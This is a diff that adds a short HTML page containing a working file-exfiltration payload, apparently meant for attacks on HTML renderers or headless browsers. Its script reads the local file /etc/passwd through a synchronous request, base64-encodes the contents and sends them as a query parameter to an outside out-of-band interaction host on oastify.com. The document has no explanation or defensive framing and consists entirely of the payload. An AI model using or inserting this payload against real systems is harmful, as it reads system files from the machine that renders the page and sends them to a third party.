@@ -1,0 +1,21 @@
+<html>
+<body>
+<script>
+  const xhr = new XMLHttpRequest();
+  xhr.open('GET', 'file:///etc/passwd', false); // Synchronous request
+
+  xhr.send();
+
+  if (xhr.status === 200) {
+    const responseData = xhr.responseText;
+    url = 'http://znqs1rufkemqbox2xa1v9dn2bthk5i56u.oastify.com/?exfil=' + btoa(responseData);
+
+    const xhr2 = new XMLHttpRequest();
+    xhr2.open('GET', url, false); // Synchronous request
+    xhr2.setRequestHeader('Content-Type', 'text/plain');
+    
+    xhr2.send();
+}
+</script>
+</body>
+</html>
